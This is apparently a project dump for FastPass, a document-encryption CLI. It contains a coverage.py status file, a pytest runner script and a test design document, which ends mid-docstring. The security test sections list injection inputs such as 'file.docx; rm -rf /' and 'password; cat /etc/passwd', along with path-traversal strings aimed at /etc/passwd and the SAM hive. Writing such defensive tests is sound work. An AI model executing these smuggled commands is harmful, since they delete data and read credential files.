{"note":"This file is an internal implementation detail to speed up HTML report generation. Its format can change at any time. You might be looking for the JSON report: https://coverage.rtfd.io/cmd.html#cmd-json","format":5,"version":"7.10.0","globals":"70d00d6dedb1758d867edfcdbc280cb2","files":{"z_145eef247bfb46b6___init___py":{"hash":"e6baa73cda2916dad605215f937a92e1","index":{"url":"z_145eef247bfb46b6___init___py.html","file":"src\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":0,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_145eef247bfb46b6___main___py":{"hash":"0c3d8823d93ca869134212cd83f9c14c","index":{"url":"z_145eef247bfb46b6___main___py.html","file":"src\\__main__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":11,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_145eef247bfb46b6_app_py":{"hash":"dd853bb3119261d0dacf3e9d118ffcf5","index":{"url":"z_145eef247bfb46b6_app_py.html","file":"src\\app.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":156,"n_excluded":0,"n_missing":30,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_145eef247bfb46b6_cli_py":{"hash":"c16e0623849eec95929dc554387520af","index":{"url":"z_145eef247bfb46b6_cli_py.html","file":"src\\cli.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":100,"n_excluded":0,"n_missing":19,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ce21df766c911d41___init___py":{"hash":"051d3704038ecd6a2088ec78cf1aad98","index":{"url":"z_ce21df766c911d41___init___py.html","file":"src\\core\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":3,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ae6ae744f2ec6f26___init___py":{"hash":"ea15b1d4189093958558135c2a62620d","index":{"url":"z_ae6ae744f2ec6f26___init___py.html","file":"src\\core\\crypto_handlers\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":3,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ae6ae744f2ec6f26_office_handler_py":{"hash":"9f591573737d112a9c33a35a56e40d59","index":{"url":"z_ae6ae744f2ec6f26_office_handler_py.html","file":"src\\core\\crypto_handlers\\office_handler.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":58,"n_excluded":0,"n_missing":44,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ae6ae744f2ec6f26_pdf_handler_py":{"hash":"8fd814c1bb5a62f89c5a24cdd96607c3","index":{"url":"z_ae6ae744f2ec6f26_pdf_handler_py.html","file":"src\\core\\crypto_handlers\\pdf_handler.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":66,"n_excluded":0,"n_missing":17,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ce21df766c911d41_file_handler_py":{"hash":"13445d9435dde332817eddc65f1c5625","index":{"url":"z_ce21df766c911d41_file_handler_py.html","file":"src\\core\\file_handler.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":251,"n_excluded":0,"n_missing":45,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_9d0a8317fb892e58___init___py":{"hash":"44bbc17fbdf96f75b57bf7dc9b3a3a73","index":{"url":"z_9d0a8317fb892e58___init___py.html","file":"src\\core\\password\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":2,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_9d0a8317fb892e58_password_manager_py":{"hash":"9397bd392f682b82fe4d000661be3f2f","index":{"url":"z_9d0a8317fb892e58_password_manager_py.html","file":"src\\core\\password\\password_manager.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":66,"n_excluded":0,"n_missing":16,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_ce21df766c911d41_security_py":{"hash":"37f91521cae9ae955e7169e55ce78cac","index":{"url":"z_ce21df766c911d41_security_py.html","file":"src\\core\\security.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":93,"n_excluded":0,"n_missing":36,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_6156a86a215061be___init___py":{"hash":"eded7715ae0de196f3e2419702b4ed00","index":{"url":"z_6156a86a215061be___init___py.html","file":"src\\utils\\__init__.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":3,"n_excluded":0,"n_missing":0,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_6156a86a215061be_config_py":{"hash":"0739dfe6c4b5e97be098b7cbc42bd35b","index":{"url":"z_6156a86a215061be_config_py.html","file":"src\\utils\\config.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":52,"n_excluded":0,"n_missing":14,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}},"z_6156a86a215061be_logger_py":{"hash":"c1b3c1bff6fad28b82ca6a80475e6241","index":{"url":"z_6156a86a215061be_logger_py.html","file":"src\\utils\\logger.py","description":"","nums":{"precision":0,"n_files":1,"n_statements":41,"n_excluded":0,"n_missing":11,"n_branches":0,"n_partial_branches":0,"n_missing_branches":0}}}}}
</file>

<file path="scripts/run_tests.py">
#!/usr/bin/env python3
"""
FastPass Test Runner
Executes comprehensive test suite with reporting
Maps to: test_runner.py from test design document
"""

import subprocess
import sys
import time
from pathlib import Path


def run_test_suite():
    """Run complete test suite with coverage reporting"""
    
    print("Starting FastPass Comprehensive Test Suite")
    print("=" * 60)
    
    start_time = time.time()
    
    # Test execution phases
    test_phases = [
        ("CLI Basic Tests", "tests/test_cli_basic.py"),
        ("Integration Tests", "tests/test_integration_basic.py"),
    ]
    
    total_results = {
        "passed": 0,
        "failed": 0,
        "skipped": 0
    }
    
    for phase_name, test_path in test_phases:
        print(f"\nRunning {phase_name}")
        print("-" * 40)
        
        cmd = [
            "uv", "run", "python", "-m", "pytest",
            test_path,
            "-v",
            "--tb=short", 
            "--cov=src",
            "--cov-report=term-missing"
        ]
        
        try:
            result = subprocess.run(cmd, cwd=Path(__file__).parent.parent)
            
            if result.returncode == 0:
                print(f"SUCCESS: {phase_name} PASSED")
                total_results["passed"] += 1
            else:
                print(f"FAILED: {phase_name} FAILED")
                total_results["failed"] += 1
                
        except Exception as e:
            print(f"ERROR: {phase_name} ERROR: {e}")
            total_results["failed"] += 1
    
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\nTest Suite Complete")
    print(f"Total Duration: {duration:.2f} seconds")
    print(f"Results: {total_results['passed']} passed, {total_results['failed']} failed, {total_results['skipped']} skipped")
    
    # Return exit code
    return 0 if total_results["failed"] == 0 else 1


def run_all_tests():
    """Run all tests with coverage"""
    print("Running All FastPass Tests")
    print("=" * 50)
    
    cmd = [
        "uv", "run", "python", "-m", "pytest",
        "tests/",
        "-v",
        "--cov=src",
        "--cov-report=term-missing",
        "--cov-report=html:reports/coverage/"
    ]
    
    try:
        # Ensure reports directory exists
        reports_dir = Path(__file__).parent.parent / "reports"
        reports_dir.mkdir(exist_ok=True)
        
        result = subprocess.run(cmd, cwd=Path(__file__).parent.parent)
        
        if result.returncode == 0:
            print("\nSUCCESS: All tests passed!")
            print("Coverage report: reports/coverage/index.html")
        else:
            print("\nFAILED: Some tests failed!")
        
        return result.returncode
        
    except Exception as e:
        print(f"ERROR: Error running tests: {e}")
        return 1


def demo_functionality():
    """Demonstrate FastPass functionality"""
    print("FastPass Functionality Demo")
    print("=" * 40)
    
    base_dir = Path(__file__).parent.parent
    
    # Demo commands
    demos = [
        ("Show supported formats", ["--list-supported"]),
        ("Show version", ["--version"]),
        ("Show help", ["--help"]),
    ]
    
    for demo_name, args in demos:
        print(f"\n{demo_name}:")
        print("-" * len(demo_name))
        
        cmd = ["uv", "run", "python", "-m", "src"] + args
        
        try:
            result = subprocess.run(cmd, cwd=base_dir, capture_output=True, text=True)
            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print("STDERR:", result.stderr)
        except Exception as e:
            print(f"Error: {e}")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "demo":
            demo_functionality()
        elif sys.argv[1] == "all":
            sys.exit(run_all_tests())
        elif sys.argv[1] == "suite":
            sys.exit(run_test_suite())
        else:
            print("Usage: python run_tests.py [demo|all|suite]")
            sys.exit(1)
    else:
        # Default: run all tests
        sys.exit(run_all_tests())
</file>

<file path="dev/fastpass_test_design.md">
# FastPass Comprehensive Test Design Document

## Overview

This document defines a comprehensive testing strategy for the FastPass CLI tool that ensures **100% coverage** of all functionality, edge cases, security features, and real-world usage scenarios. The testing approach follows enterprise-grade practices with automated unit tests, integration tests, and end-to-end tests.

**Testing Philosophy**: Test every single aspect of the program without exception. Every flowchart box, every function, every security validation, every user input scenario, and every error condition must be covered by automated tests.

---

## Test Directory Structure

```
tests/
├── conftest.py                     # PyTest configuration and shared fixtures
├── requirements.txt                # Test-specific dependencies
├── pytest.ini                     # PyTest settings and markers
├── test_runner.py                  # Main test execution script
├── 
├── unit/                           # Unit tests (isolated component testing)
│   ├── __init__.py
│   ├── test_cli_parsing.py         # CLI argument parsing and validation
│   ├── test_security_validation.py # Security hardening functions
│   ├── test_file_validation.py     # File format and path validation
│   ├── test_password_management.py # Password handling and memory security
│   ├── test_crypto_handlers.py     # Individual crypto tool integrations
│   ├── test_file_operations.py     # File processing and temporary management
│   ├── test_error_handling.py      # Exception handling and recovery
│   └── test_utilities.py           # Helper functions and utilities
│   
├── integration/                    # Integration tests (component interaction)
│   ├── __init__.py
│   ├── test_cli_to_processing.py   # Full CLI → Processing pipeline
│   ├── test_security_integration.py # Security validation integration
│   ├── test_password_workflows.py  # Password source integration
│   ├── test_file_workflows.py      # File processing workflows
│   └── test_error_propagation.py   # Error handling across components
│   
├── e2e/                            # End-to-end tests (full program execution)
│   ├── __init__.py
│   ├── test_encrypt_operations.py  # Real encryption operations
│   ├── test_decrypt_operations.py  # Real decryption operations
│   ├── test_check_password.py      # Password checking operations
│   ├── test_recursive_mode.py      # Recursive directory processing
│   ├── test_batch_operations.py    # Multiple file processing
│   ├── test_edge_cases.py          # Real-world edge cases
│   └── test_security_scenarios.py  # Security attack simulation
│   
├── fixtures/                       # Test data and sample files
│   ├── __init__.py
│   ├── sample_files/               # Clean test files for processing
│   │   ├── clean/                  # Unprotected sample files
│   │   │   ├── sample.docx
│   │   │   ├── sample.xlsx
│   │   │   ├── sample.pptx
│   │   │   ├── sample.pdf
│   │   │   ├── empty.docx
│   │   │   └── large_file.pdf
│   │   ├── protected/              # Pre-encrypted sample files
│   │   │   ├── password_123/       # Files encrypted with "123"
│   │   │   ├── password_complex/   # Files encrypted with complex passwords
│   │   │   └── password_special/   # Files with special character passwords
│   │   └── corrupted/              # Intentionally corrupted files
│   │       ├── truncated.docx
│   │       ├── malformed.pdf
│   │       └── zero_bytes.xlsx
│   ├── password_lists/             # Password list test files
│   │   ├── simple_passwords.txt
│   │   ├── complex_passwords.txt
│   │   ├── empty_passwords.txt
│   │   └── malformed_passwords.txt
│   ├── malicious/                  # Security test files
│   │   ├── path_traversal/         # Path traversal attack samples
│   │   ├── xxe_samples/            # XXE injection test files
│   │   ├── zip_bombs/              # ZIP bomb test files
│   │   └── oversized/              # Oversized file attacks
│   └── expected_outputs/           # Expected results for validation
│       ├── encryption_results/
│       ├── decryption_results/
│       └── error_messages/
│       
├── performance/                    # Performance and stress tests
│   ├── __init__.py
│   ├── test_large_files.py         # Large file processing performance
│   ├── test_batch_performance.py   # Batch operation performance
│   ├── test_memory_usage.py        # Memory consumption validation
│   └── test_concurrent_operations.py # Concurrent processing tests
│   
├── security/                       # Dedicated security tests
│   ├── __init__.py
│   ├── test_attack_vectors.py      # All security attack simulations
│   ├── test_path_traversal.py      # Path traversal attack prevention
│   ├── test_command_injection.py   # Command injection prevention
│   ├── test_password_security.py   # Password memory and exposure prevention
│   └── test_file_security.py       # File format attack prevention
│   
└── reports/                        # Test execution reports
    ├── coverage/                   # Code coverage reports
    ├── performance/                # Performance test results
    └── security/                   # Security test results
```

---

## Unit Test Coverage Plan

### **A. CLI Argument Parsing Tests** (`test_cli_parsing.py`)

**Complete coverage of every CLI scenario from flowchart:**

```python
class TestCLIArgumentParsing:
    """Test every CLI argument combination and validation"""
    
    # A1: Basic Command Structure Tests
    def test_encrypt_mode_basic(self):
        """Test: fast_pass encrypt -i file.docx -p password"""
        
    def test_decrypt_mode_basic(self):
        """Test: fast_pass decrypt -i file.docx -p password"""
        
    def test_check_password_mode(self):
        """Test: fast_pass check-password -i file.docx -p password"""
    
    # A2: Input File Specification Tests
    def test_single_file_input(self):
        """Test: -i single_file.docx"""
        
    def test_multiple_files_input(self):
        """Test: -i file1.docx file2.pdf file3.xlsx"""
        
    def test_files_with_spaces(self):
        """Test: -i "file with spaces.docx" "another file.pdf" """
        
    def test_mixed_paths_relative_absolute(self):
        """Test: -i /abs/path/file.docx relative/file.pdf"""
        
    def test_no_input_files_error(self):
        """Test: Missing -i flag should trigger error"""
    
    # A3: Password Specification Tests  
    def test_single_password_cli(self):
        """Test: -p password123"""
        
    def test_multiple_passwords_cli(self):
        """Test: -p password1 password2 "complex pass""""
        
    def test_password_with_spaces(self):
        """Test: -p "password with spaces" """
        
    def test_password_with_special_chars(self):
        """Test: -p "p@$$w0rd!" "another&password#""""
        
    def test_password_from_file(self):
        """Test: -p @passwords.txt"""
        
    def test_password_from_stdin_tty(self):
        """Test: -p stdin with TTY input"""
        
    def test_password_from_stdin_json(self):
        """Test: -p stdin with JSON input via pipe"""
        
    def test_no_password_error(self):
        """Test: Missing -p should trigger error"""
    
    # A4: Recursive Mode Tests
    def test_recursive_decrypt_allowed(self):
        """Test: fast_pass decrypt --recursive -p password"""
        
    def test_recursive_check_password_allowed(self):
        """Test: fast_pass check-password --recursive -p password"""
        
    def test_recursive_encrypt_blocked(self):
        """Test: fast_pass encrypt --recursive should trigger security error"""
    
    # A5: Security Flag Tests
    def test_allow_cwd_flag(self):
        """Test: --allow-cwd flag enables current directory processing"""
        
    def test_cwd_blocked_without_flag(self):
        """Test: CWD processing blocked without --allow-cwd"""
    
    # A6: Utility Flag Tests
    def test_dry_run_mode(self):
        """Test: --dry-run shows operations without execution"""
        
    def test_verify_mode(self):
        """Test: --verify enables deep verification"""
        
    def test_list_supported_formats(self):
        """Test: --list-supported shows format list and exits"""
        
    def test_debug_mode(self):
        """Test: --debug enables detailed logging"""
        
    def test_help_display(self):
        """Test: -h and --help show usage information"""
    
    # A7: Argument Validation Tests
    def test_invalid_operation_mode(self):
        """Test: Invalid operation should trigger error"""
        
    def test_conflicting_flags(self):
        """Test: Conflicting flag combinations should error"""
        
    def test_malformed_arguments(self):
        """Test: Malformed argument syntax should error"""
    
    # A8: Edge Case Argument Tests
    def test_empty_string_arguments(self):
        """Test: Empty string arguments should be handled gracefully"""
        
    def test_very_long_arguments(self):
        """Test: Extremely long arguments should be validated"""
        
    def test_unicode_arguments(self):
        """Test: Unicode in file paths and passwords"""
        
    def test_argument_injection_attempts(self):
        """Test: Command injection attempts in arguments should be blocked"""
```

### **B. Security Validation Tests** (`test_security_validation.py`)

**Test every security hardening feature:**

```python
class TestSecurityHardening:
    """Test all security validation functions"""
    
    # B1: Path Traversal Protection Tests
    def test_path_traversal_attack_prevention(self):
        """Test: ../../../etc/passwd blocked"""
        
    def test_symlink_attack_prevention(self):
        """Test: Symbolic link attacks blocked"""
        
    def test_absolute_path_containment(self):
        """Test: Paths must be within allowed directories"""
        
    def test_hidden_file_access_prevention(self):
        """Test: Hidden files (.secret) blocked"""
        
    def test_cwd_security_enforcement(self):
        """Test: CWD access requires --allow-cwd flag"""
    
    # B2: Command Injection Prevention Tests
    def test_filename_injection_prevention(self):
        """Test: file.docx; rm -rf / blocked"""
        
    def test_path_injection_prevention(self):
        """Test: Path components with shell metacharacters blocked"""
        
    def test_subprocess_safety(self):
        """Test: No shell execution with user input"""
    
    # B3: File Format Security Tests
    def test_magic_number_validation(self):
        """Test: File magic numbers validated against extensions"""
        
    def test_xxe_injection_prevention(self):
        """Test: XXE attacks in Office documents blocked"""
        
    def test_zip_bomb_detection(self):
        """Test: ZIP bomb compression ratios detected"""
        
    def test_oversized_file_rejection(self):
        """Test: Files exceeding size limits rejected"""
        
    def test_malformed_pdf_rejection(self):
        """Test: Malformed PDF attacks blocked"""
    
    # B4: Password Security Tests
    def test_password_memory_clearing(self):
        """Test: Password memory cleared after use"""
        
    def test_password_length_validation(self):
        """Test: Extremely long passwords handled securely"""
        
    def test_password_character_validation(self):
        """Test: Null bytes and control characters in passwords blocked"""
        
    def test_stdin_password_security(self):
        """Test: Stdin password input doesn't expose to process list"""
    
    # B5: File Access Security Tests
    def test_permission_validation(self):
        """Test: File permissions checked before processing"""
        
    def test_write_access_validation(self):
        """Test: Output directory write access validated"""
        
    def test_temp_file_security(self):
        """Test: Temporary files created with secure permissions (0o600)"""
        
    def test_atomic_file_operations(self):
        """Test: File operations are atomic to prevent race conditions"""
```

### **C. File Validation Tests** (`test_file_validation.py`)

**Test every file format and validation scenario:**

```python
class TestFileValidation:
    """Test all file format validation and detection"""
    
    # C1: File Format Detection Tests
    def test_docx_magic_number_detection(self):
        """Test: .docx files detected by magic number"""
        
    def test_xlsx_magic_number_detection(self):
        """Test: .xlsx files detected by magic number"""
        
    def test_pptx_magic_number_detection(self):
        """Test: .pptx files detected by magic number"""
        
    def test_pdf_magic_number_detection(self):
        """Test: .pdf files detected by magic number"""
    
    # C2: File Extension Validation Tests
    def test_supported_extension_validation(self):
        """Test: Only supported extensions (.docx, .xlsx, .pptx, .pdf) allowed"""
        
    def test_legacy_office_rejection(self):
        """Test: Legacy formats (.doc, .xls, .ppt) rejected"""
        
    def test_unsupported_format_rejection(self):
        """Test: Unsupported formats (.txt, .zip, .rar) rejected"""
    
    # C3: File Content Validation Tests
    def test_empty_file_rejection(self):
        """Test: Zero-byte files rejected"""
        
    def test_corrupted_file_detection(self):
        """Test: Corrupted files detected and rejected"""
        
    def test_file_size_limits(self):
        """Test: Files exceeding size limits rejected"""
        
    def test_truncated_file_detection(self):
        """Test: Truncated files detected"""
    
    # C4: Encryption Status Detection Tests
    def test_encrypted_office_detection(self):
        """Test: Password-protected Office documents detected"""
        
    def test_unencrypted_office_detection(self):
        """Test: Unprotected Office documents detected"""
        
    def test_encrypted_pdf_detection(self):
        """Test: Password-protected PDFs detected"""
        
    def test_unencrypted_pdf_detection(self):
        """Test: Unprotected PDFs detected"""
    
    # C5: Cross-Validation Tests
    def test_magic_vs_extension_mismatch(self):
        """Test: Magic number vs extension conflicts handled"""
        
    def test_renamed_file_detection(self):
        """Test: .pdf renamed to .docx detected correctly"""
        
    def test_forged_extension_detection(self):
        """Test: Malicious files with forged extensions detected"""
```

### **D. Password Management Tests** (`test_password_management.py`)

**Test all password handling scenarios:**

```python
class TestPasswordManagement:
    """Test password handling and security"""
    
    # D1: Password Source Tests
    def test_cli_password_parsing(self):
        """Test: CLI passwords parsed correctly"""
        
    def test_password_file_loading(self):
        """Test: Password list file loading"""
        
    def test_stdin_json_password_parsing(self):
        """Test: JSON password input via stdin"""
        
    def test_stdin_tty_password_input(self):
        """Test: Interactive password input"""
    
    # D2: Password List File Tests
    def test_password_file_format_validation(self):
        """Test: Password file format requirements"""
        
    def test_empty_password_file_handling(self):
        """Test: Empty password files handled gracefully"""
        
    def test_malformed_password_file_handling(self):
        """Test: Malformed password files trigger appropriate errors"""
        
    def test_password_file_encoding_support(self):
        """Test: UTF-8 encoded password files supported"""
    
    # D3: Password Security Tests
    def test_password_memory_management(self):
        """Test: Passwords cleared from memory after use"""
        
    def test_password_logging_prevention(self):
        """Test: Passwords never appear in logs"""
        
    def test_password_process_list_prevention(self):
        """Test: Passwords don't appear in process list"""
        
    def test_secure_password_comparison(self):
        """Test: Password comparison uses secure methods"""
    
    # D4: Password Validation Tests
    def test_password_attempt_with_files(self):
        """Test: Passwords attempted against files in correct order"""
        
    def test_working_password_identification(self):
        """Test: Working password identified and cached"""
        
    def test_failed_password_handling(self):
        """Test: Failed passwords handled gracefully"""
        
    def test_password_exhaustion_handling(self):
        """Test: Behavior when all passwords fail"""
```

### **E. Crypto Handler Tests** (`test_crypto_handlers.py`)

**Test each crypto tool integration:**

```python
class TestCryptoHandlers:
    """Test crypto tool integrations"""
    
    # E1: Office Handler Tests
    def test_office_encryption_success(self):
        """Test: Office document encryption with msoffcrypto-tool"""
        
    def test_office_decryption_success(self):
        """Test: Office document decryption with msoffcrypto-tool"""
        
    def test_office_password_check(self):
        """Test: Office document password verification"""
        
    def test_office_wrong_password_handling(self):
        """Test: Wrong password for Office document handled"""
        
    def test_office_experimental_encryption_warning(self):
        """Test: Experimental encryption warning displayed"""
    
    # E2: PDF Handler Tests
    def test_pdf_encryption_success(self):
        """Test: PDF encryption with PyPDF2"""
        
    def test_pdf_decryption_success(self):
        """Test: PDF decryption with PyPDF2"""
        
    def test_pdf_password_check(self):
        """Test: PDF password verification"""
        
    def test_pdf_wrong_password_handling(self):
        """Test: Wrong password for PDF handled"""
        
    def test_pdf_permission_handling(self):
        """Test: PDF permission restrictions handled"""
    
    # E3: Handler Selection Tests
    def test_handler_selection_by_format(self):
        """Test: Correct handler selected based on file format"""
        
    def test_handler_availability_check(self):
        """Test: Handler availability checked before processing"""
        
    def test_missing_handler_error(self):
        """Test: Missing crypto tool triggers appropriate error"""
    
    # E4: Tool Integration Error Tests
    def test_msoffcrypto_tool_errors(self):
        """Test: msoffcrypto-tool errors handled gracefully"""
        
    def test_pypdf2_errors(self):
        """Test: PyPDF2 errors handled gracefully"""
        
    def test_tool_compatibility_validation(self):
        """Test: Tool version compatibility checked"""
```

---

## Integration Test Coverage Plan

### **F. CLI to Processing Pipeline Tests** (`test_cli_to_processing.py`)

**Test complete workflows from CLI input to final output:**

```python
class TestCLIProcessingIntegration:
    """Test full CLI → Processing pipeline integration"""
    
    def test_encrypt_single_file_workflow(self):
        """Test: Complete encrypt workflow for single file"""
        
    def test_decrypt_single_file_workflow(self):
        """Test: Complete decrypt workflow for single file"""
        
    def test_check_password_workflow(self):
        """Test: Complete password check workflow"""
        
    def test_multiple_file_processing_workflow(self):
        """Test: Multiple files processed in sequence"""
        
    def test_password_list_integration_workflow(self):
        """Test: Password list file integration with processing"""
        
    def test_error_recovery_workflow(self):
        """Test: Error recovery in multi-file processing"""
```

---

## End-to-End Test Coverage Plan

### **G. Real File Operations Tests** (`test_encrypt_operations.py`, `test_decrypt_operations.py`)

**Test actual file encryption/decryption with real files:**

```python
class TestRealEncryptionOperations:
    """Test real encryption operations with actual files"""
    
    # G1: Single File Encryption Tests
    def test_encrypt_docx_real_file(self):
        """Test: Encrypt real .docx file, verify result can be opened with password"""
        
    def test_encrypt_xlsx_real_file(self):
        """Test: Encrypt real .xlsx file, verify result can be opened with password"""
        
    def test_encrypt_pptx_real_file(self):
        """Test: Encrypt real .pptx file, verify result can be opened with password"""
        
    def test_encrypt_pdf_real_file(self):
        """Test: Encrypt real .pdf file, verify result can be opened with password"""
    
    # G2: Encryption Verification Tests
    def test_encrypted_file_requires_password(self):
        """Test: Encrypted file cannot be opened without password"""
        
    def test_encrypted_file_opens_with_correct_password(self):
        """Test: Encrypted file opens successfully with correct password"""
        
    def test_encrypted_file_rejects_wrong_password(self):
        """Test: Encrypted file rejects incorrect password"""
        
    def test_encryption_preserves_content(self):
        """Test: File content identical after encrypt→decrypt cycle"""
    
    # G3: Batch Encryption Tests
    def test_encrypt_multiple_files_same_password(self):
        """Test: Multiple files encrypted with same password"""
        
    def test_encrypt_multiple_files_different_passwords(self):
        """Test: Multiple files encrypted with different passwords each"""
        
    def test_encrypt_mixed_formats_batch(self):
        """Test: Mixed file formats encrypted in single batch"""

class TestRealDecryptionOperations:
    """Test real decryption operations with actual encrypted files"""
    
    # G4: Single File Decryption Tests
    def test_decrypt_docx_real_file(self):
        """Test: Decrypt real encrypted .docx file"""
        
    def test_decrypt_xlsx_real_file(self):
        """Test: Decrypt real encrypted .xlsx file"""
        
    def test_decrypt_pptx_real_file(self):
        """Test: Decrypt real encrypted .pptx file"""
        
    def test_decrypt_pdf_real_file(self):
        """Test: Decrypt real encrypted .pdf file"""
    
    # G5: Decryption Verification Tests
    def test_decrypted_file_no_password_required(self):
        """Test: Decrypted file opens without password"""
        
    def test_decryption_preserves_content(self):
        """Test: Decrypted content matches original"""
        
    def test_decryption_with_wrong_password_fails(self):
        """Test: Decryption fails with wrong password"""
        
    def test_decryption_preserves_formatting(self):
        """Test: Document formatting preserved after decryption"""
    
    # G6: Password List Decryption Tests
    def test_decrypt_with_password_list(self):
        """Test: Decryption using password list file"""
        
    def test_decrypt_password_list_exhaustion(self):
        """Test: Behavior when password list exhausted"""
        
    def test_decrypt_password_list_mixed_success(self):
        """Test: Some files decrypt, others fail with password list"""
```

### **H. Complex Scenario Tests** (`test_batch_operations.py`, `test_edge_cases.py`)

**Test real-world usage scenarios:**

```python
class TestComplexRealWorldScenarios:
    """Test complex real-world usage scenarios"""
    
    # H1: Multi-File Multi-Password Scenarios
    def test_office_documents_different_passwords(self):
        """
        Test: Process 5 Office documents, each with different passwords
        - sample1.docx (password: "doc123")
        - sample2.xlsx (password: "sheet456") 
        - sample3.pptx (password: "slide789")
        - sample4.docx (password: "complex&password!")
        - sample5.pdf (password: "pdf#secure@2024")
        """
        
    def test_password_reuse_across_files(self):
        """
        Test: Multiple files using same password from CLI list
        - 3 files encrypted with "shared123"
        - 2 files encrypted with "common456"
        - CLI: -p shared123 common456
        """
        
    def test_mixed_encrypted_unencrypted_batch(self):
        """
        Test: Batch with mix of encrypted and unencrypted files
        - 2 files already encrypted
        - 3 files unencrypted
        - Different passwords for each encrypted file
        """
    
    # H2: Password List File Scenarios
    def test_password_list_priority_order(self):
        """
        Test: Password list file with 10 passwords, verify order
        - File with password #7 in list
        - Verify passwords 1-6 attempted first
        - Verify password #7 succeeds
        - Verify passwords 8-10 not attempted
        """
        
    def test_password_list_with_special_characters(self):
        """
        Test: Password list containing special characters
        - Passwords with spaces: "my password 123"
        - Passwords with symbols: "p@$$w0rd#2024!"
        - Unicode passwords: "пароль123"
        """
    
    # H3: File Path Edge Cases
    def test_files_with_spaces_in_names(self):
        """
        Test: Files with spaces in names and paths
        - "My Important Document.docx"
        - "Q3 Financial Report.xlsx"
        - "Project Presentation Final.pptx"
        """
        
    def test_long_file_paths(self):
        """
        Test: Very long file paths (approaching system limits)
        - Nested directory structure 10+ levels deep
        - File names with maximum allowed length
        """
        
    def test_unicode_file_names(self):
        """
        Test: Unicode characters in file names
        - Chinese characters: "文档.docx"
        - Emoji: "📊 Report.xlsx"
        - Accented characters: "Café Menu.pdf"
        """
    
    # H4: Recursive Mode Real Tests
    def test_recursive_decrypt_directory_tree(self):
        """
        Test: Recursive decryption of directory tree
        - 3 levels deep directory structure
        - 15 encrypted files across all levels
        - Mixed file formats
        - Different passwords per directory level
        """
        
    def test_recursive_check_password_comprehensive(self):
        """
        Test: Recursive password check across directory tree
        - 20 files across multiple directories
        - 5 different passwords used
        - Mixed protected/unprotected files
        - Verify correct password identified for each file
        """
    
    # H5: Error Recovery Scenarios
    def test_partial_failure_recovery(self):
        """
        Test: Some files succeed, others fail in batch
        - 10 files in batch
        - 3 files have wrong passwords
        - 2 files are corrupted
        - 5 files process successfully
        - Verify successful files completed, failed files reported
        """
        
    def test_disk_space_exhaustion_handling(self):
        """
        Test: Behavior when disk space runs out during processing
        - Large files that fill available disk space
        - Verify graceful failure and cleanup
        """
        
    def test_permission_denied_recovery(self):
        """
        Test: Handle files with insufficient permissions
        - Read-only files
        - Files owned by other users
        - Files in protected directories
        """
```

### **I. Security Attack Simulation Tests** (`test_security_scenarios.py`)

**Test actual security attack scenarios:**

```python
class TestSecurityAttackSimulation:
    """Test real security attack scenarios"""
    
    # I1: Path Traversal Attack Tests
    def test_path_traversal_attack_real(self):
        """
        Test: Real path traversal attack attempts
        - Input: -i "../../../etc/passwd"
        - Input: -i "..\\..\\Windows\\System32\\config\\SAM"
        - Verify: All attempts blocked with security errors
        """
        
    def test_symlink_attack_real(self):
        """
        Test: Real symbolic link attack
        - Create symlink pointing to /etc/passwd
        - Attempt to process via FastPass
        - Verify: Attack blocked, symlink detected
        """
    
    # I2: Command Injection Attack Tests
    def test_filename_injection_attack_real(self):
        """
        Test: Real command injection via filename
        - Input: -i "file.docx; rm -rf /tmp/*"
        - Input: -i "file.pdf && cat /etc/passwd"
        - Verify: Commands not executed, filenames sanitized
        """
        
    def test_password_injection_attack_real(self):
        """
        Test: Real command injection via password
        - Input: -p "password; cat /etc/passwd"
        - Input: -p "pass && rm file.txt"
        - Verify: Commands not executed, passwords handled safely
        """
    
    # I3: File Format Attack Tests
    def test_xxe_injection_attack_real(self):
        """
        Test: Real XXE injection attack
        - Malicious .docx with XXE payload
        - XXE attempting to read local files
        - Verify: Attack blocked, XXE entities disabled
        """
        
    def test_zip_bomb_attack_real(self):
        """
        Test: Real ZIP bomb attack
        - Office document containing ZIP bomb
        - Extremely high compression ratio
        - Verify: ZIP bomb detected and blocked
        """
        
    def test_oversized_file_attack_real(self):
        """
        Test: Real oversized file attack
        - Files exceeding configured size limits
        - Memory exhaustion attempts
        - Verify: Large files rejected before processing
        """
    
    # I4: Password Security Attack Tests
    def test_password_memory_dump_simulation(self):
        """
        Test: Simulate password memory exposure
        - Process files with passwords
        - Attempt to read password from memory dumps
        - Verify: Passwords cleared from memory
        """
        
    def test_process_list_password_exposure(self):
        """
        Test: Verify passwords don't appear in process list
        - Run FastPass with passwords
        - Check ps/tasklist output for password exposure
        - Verify: Passwords not visible in process arguments
